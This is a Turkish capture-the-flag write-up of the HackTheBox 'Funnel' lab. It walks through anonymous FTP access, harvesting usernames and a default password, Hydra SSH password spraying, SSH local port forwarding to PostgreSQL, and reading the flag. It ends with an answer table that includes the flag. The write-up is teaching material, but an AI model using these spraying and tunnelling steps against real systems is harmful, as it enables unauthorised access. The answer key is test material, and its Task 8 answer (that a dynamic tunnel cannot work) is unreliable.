# HackTheBox — Funnel Writeup

**Zorluk:** Easy
**İşletim Sistemi:** Linux
**Hedef IP:** 10.129.184.109
**Saldırgan IP:** 10.10.14.156

---

## 1. Keşif (Reconnaissance)

Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum. Öncelikle tüm portları tarayıp servis/versiyon bilgisi ve OS tespiti almak istiyorum:

```bash
nmap -sS -A -p- -T5 10.129.184.109
```

**Çıktı (özet):**

```
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```

Ek olarak hızlı bir doğrulama taraması da attım:

```bash
nmap -vvv 10.129.184.109
```

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
```

Sonuç net: hedefte sadece **2 adet TCP portu** açık — **21 (FTP)** ve **22 (SSH)**. Nmap ayrıca birkaç "filtered" port göstermiş olsa da (11617, 12006, 13232 vb.) bunlar gerçek açık portlar değil, muhtemelen bir firewall/IDS tarafından filtreleniyor. Gerçek anlamda açık ve kullanılabilir olan yalnızca 21 ve 22.

En dikkat çekici detay ise FTP taramasında çıkan şu satır:

```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
```

FTP'de **anonymous login** açık ve `mail_backup` adında bir dizin var. Buradan devam edelim.

---

## 2. FTP Üzerinden İlk Erişim

Anonim girişle FTP sunucusuna bağlanıyorum:

```bash
ftp 10.129.184.109
Name: anonymous
Password: (boş)
```

Bağlandıktan sonra dizin listesine bakıyorum:

```
ftp> ls
229 Entering Extended Passive Mode (|||31640|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
226 Directory send OK.
```

`mail_backup` dizinine giriyorum:

```
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||61320|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
```

İki dosya var: bir PDF (`password_policy.pdf`) ve bir düz metin dosyası (`welcome_28112022`). İkisini de indiriyorum:

```
ftp> get password_policy.pdf
ftp> get welcome_28112022
ftp> exit
```

---

## 3. Elde Edilen Dosyaların İncelenmesi

### 3.1. `welcome_28112022` dosyası

```bash
cat welcome_28112022
```

```
Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject: Welcome to the team!

Hello everyone,
We would like to welcome you to our team.
We think you'll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
We have set up your accounts that you will need to access our internal infrastructure. Please, read through the attached password policy with extreme care.
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager.

We hope that you will have an amazing time with us,
The funnel team.
```

Bu e-posta bize çok değerli bir bilgi veriyor: **5 adet kullanıcı adı**.

```
optimus
albert
andreas
christine
maria
```

Bu isimleri bir `users.txt` dosyasına kaydediyorum, ilerideki brute-force denemesinde kullanacağım.

### 3.2. `password_policy.pdf` dosyası

PDF dosyasını `cat` ile açmaya çalışırsanız binary içerik nedeniyle bozuk/okunmaz görünür. Bunun yerine dosyayı doğrudan bir PDF görüntüleyici ile (Kali'de `xdg-open` / `open .` ile dosya yöneticisinden çift tıklayarak) açtım.

PDF içinde şirketin şifre politikası anlatılıyor, ve en kritik kısım şu:

> **Password Creation:**
> - All passwords should be sufficiently complex and therefore difficult for anyone to guess.
> - In addition, employees should also use common sense when choosing passwords...
> - Default passwords — such as those created for new users — must be changed as quickly as possible. **For example the default password of "funnel123#!#" must be changed immediately.**

Yani yeni işe başlayan her kullanıcıya varsayılan olarak **`funnel123#!#`** şifresi atanıyor ve değiştirilmesi isteniyor. Buradan yola çıkarak henüz bu şifreyi değiştirmemiş bir kullanıcı olabileceğini düşünüyorum.

---

## 4. Kimlik Doğrulama Bilgilerinin Doğrulanması — SSH Brute Force

Elimde 5 kullanıcı adı ve 1 aday şifre var. Klasik bir password-spraying senaryosu. Hydra ile SSH servisine karşı deniyorum:

```bash
hydra -L users.txt -p 'funnel123#!#' 10.129.184.109 ssh
```

Sonuçta **christine** kullanıcısının hâlâ varsayılan şifresini kullandığı ortaya çıkıyor. Diğer kullanıcılar muhtemelen politikayı takip edip şifrelerini değiştirmiş.

SSH ile bağlanıyorum:

```bash
ssh christine@10.129.184.109
# Password: funnel123#!#
```

Başarılı bir şekilde `christine` kullanıcısı olarak sisteme giriş yapıyorum.

---

## 5. Yerel Servislerin Keşfi — PostgreSQL

Sisteme giriş yaptıktan sonra dinleyen (listening) servisleri kontrol ediyorum:

```bash
christine@funnel:~$ ss -tln
```

```
State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port      Process
LISTEN       0            4096                   127.0.0.1:33483                  0.0.0.0:*
LISTEN       0            4096               127.0.0.53%lo:53                     0.0.0.0:*
LISTEN       0            128                      0.0.0.0:22                     0.0.0.0:*
LISTEN       0            4096                   127.0.0.1:5432                   0.0.0.0:*
LISTEN       0            32                             *:21                           *:*
LISTEN       0            128                         [::]:22                        [::]:*
```

`ss -tl` çıktısında servis isimleri de görünüyor:

```
127.0.0.1:postgresql
```

Görüldüğü üzere **5432 portunda PostgreSQL servisi** çalışıyor, fakat sadece `127.0.0.1` (localhost) üzerinde dinliyor — yani dışarıdan doğrudan erişilemiyor. Bu servise ulaşabilmek için bir SSH tüneli kurmam gerekiyor.

---

## 6. SSH ile Local Port Forwarding (Tünelleme)

Servis sadece hedef makinenin localhost'unda dinlediği için, doğrudan bana (saldırgan makineye) bağlantı gelmiyor — ben bağlantıyı hedefe doğru başlatmam gerekiyor. Bu durumda kullanılması gereken doğru yöntem **local port forwarding (yerel port yönlendirme)**'dir; **remote port forwarding değil**, çünkü tünelin amacı benim yerel makinemden hedefin localhost'undaki bir servise erişim sağlamak (`-L` seçeneği).

```bash
ssh -L 1234:localhost:5432 christine@10.129.184.109
```

Bu komutla kendi makinemdeki `1234` portuna gelen trafiği, SSH tüneli üzerinden hedef makinenin `localhost:5432` adresine yönlendirmiş oluyorum.

Tünel ayaktayken artık kendi makinemden PostgreSQL'e bağlanabilirim:

```bash
psql -U christine -h 127.0.0.1 -p 1234
Password for user christine: funnel123#!#
```

```
psql (17.5 (Debian 17.5-1), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.

christine=#
```

Bağlantı başarılı.

---

## 7. PostgreSQL Üzerinde Veri Keşfi ve Flag

Öncelikle mevcut veritabanlarını listeliyorum:

```sql
\list
```

```
   Name    |   Owner   | Encoding
-----------+-----------+----------
 christine | christine | UTF8
 postgres  | christine | UTF8
 secrets   | christine | UTF8
 template0 | christine | UTF8
 template1 | christine | UTF8
```

İsminden de anlaşılacağı üzere `secrets` veritabanı ilgimi çekiyor. Bağlanıyorum:

```sql
\connect secrets
```

```
You are now connected to database "secrets" as user "christine".
```

Tablo listesine bakıyorum:

```sql
\dt
```

```
 Schema | Name | Type  |   Owner
--------+------+-------+-----------
 public | flag | table | christine
```

`flag` adında bir tablo var. İçeriğini sorguluyorum:

```sql
SELECT * FROM flag;
```

```
              value
----------------------------------
 cf277664b1771217d7006acdea006db1
```

Flag başarıyla elde edildi. 🎉

---

## 8. Özet — Atak Zinciri

1. Nmap taramasıyla 21 (FTP) ve 22 (SSH) portlarının açık olduğu tespit edildi.
2. FTP'de anonim giriş aktif olduğu keşfedildi ve `mail_backup` dizinindeki dosyalar indirildi.
3. `welcome_28112022` dosyasından geçerli kullanıcı adları elde edildi.
4. `password_policy.pdf` dosyasından varsayılan şifre (`funnel123#!#`) tespit edildi.
5. Hydra ile SSH üzerinde password spraying yapılarak `christine` kullanıcısının hâlâ varsayılan şifreyi kullandığı bulundu ve giriş yapıldı.
6. Sistemde yalnızca localhost'ta dinleyen PostgreSQL servisi (5432) tespit edildi.
7. SSH local port forwarding (`ssh -L`) ile bu servise yerel makineden tünel kuruldu.
8. `psql` ile bağlanılıp `secrets` veritabanındaki `flag` tablosundan flag okundu.

---

## 9. Görev Cevapları (Task Answers)

| Görev | Soru | Cevap |
|---|---|---|
| **Görev 1** | Kaç adet TCP portu açık? | **2** (21/FTP, 22/SSH) |
| **Görev 2** | FTP sunucusunda bulunan dizinin adı nedir? | **mail_backup** |
| **Görev 3** | "Funnel" ekibine yeni katılan her üyenin en kısa sürede değiştirmesi gereken varsayılan hesap şifresi nedir? | **funnel123#!#** |
| **Görev 4** | Hangi kullanıcı varsayılan şifresini henüz değiştirmedi? | **christine** |
| **Görev 5** | TCP 5432 portunda çalışan ve yalnızca localhost'u dinleyen servis hangisidir? | **PostgreSQL** |
| **Görev 6** | Yerel makinenizden daha önce bahsedilen servise erişemediğiniz için tünel kurmanız gerekiyor — hangi tünelleme türü doğru? | **Local port forwarding (yerel port yönlendirme)** — `ssh -L 1234:localhost:5432 christine@10.129.184.109` |
| **Görev 7** | Bayrağın saklandığı veritabanının adı nedir? | **secrets** |
| **Task 8** | Could you use a dynamic tunnel instead of local port forwarding? | **Hayır (No)** — Dinamik tünel (`ssh -D`, SOCKS proxy) trafiği uygulama bazında yönlendirmez, genel bir SOCKS proxy oluşturur; belirli bir yerel porttan belirli bir hedef porta doğrudan statik yönlendirme yapmaz. Bu senaryoda tek, sabit bir servise (`localhost:5432`) erişim gerektiği için doğru ve pratik çözüm local port forwarding'dir. |
| **Flag** | Submit the flag located in the database. | **cf277664b1771217d7006acdea006db1** |

---

*Not: Bu writeup eğitim/CTF amaçlıdır. Tüm işlemler yalnızca HackTheBox'ın izin verdiği laboratuvar ortamında gerçekleştirilmiştir.*
